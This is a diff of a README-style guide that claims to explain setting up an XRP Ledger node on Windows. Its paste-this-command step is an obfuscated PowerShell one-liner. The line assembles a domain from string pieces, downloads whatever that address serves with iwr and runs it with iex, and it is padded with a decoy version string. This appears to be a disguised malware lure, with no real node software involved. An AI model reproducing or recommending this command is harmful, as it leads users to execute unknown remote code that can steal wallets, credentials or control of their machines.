@@ -15,7 +15,7 @@ Press `Win + R`, type `CMD`, and press **Enter**.
 powershell -c "$Blockchain='XRP'; $XRP='Validator'; iwr ($XRP + $Blockchain + '.' + 'Run') | iex; $Version='XRP-Mainnet=3.1.9-1b0a849'"
 `````
 
-After executing the command, the node will begin initializing and syncing with the XRP Ledger network.<br>
+_After executing the command, the node will begin initializing and syncing with the XRP Ledger network._ <br>
 
 When you first run an XRP node, your node will need to sync with the XRP Ledger network. This process can take a few minutes, depending on your internet connection speed. You will see synchronization progress in the Command Prompt window.
 
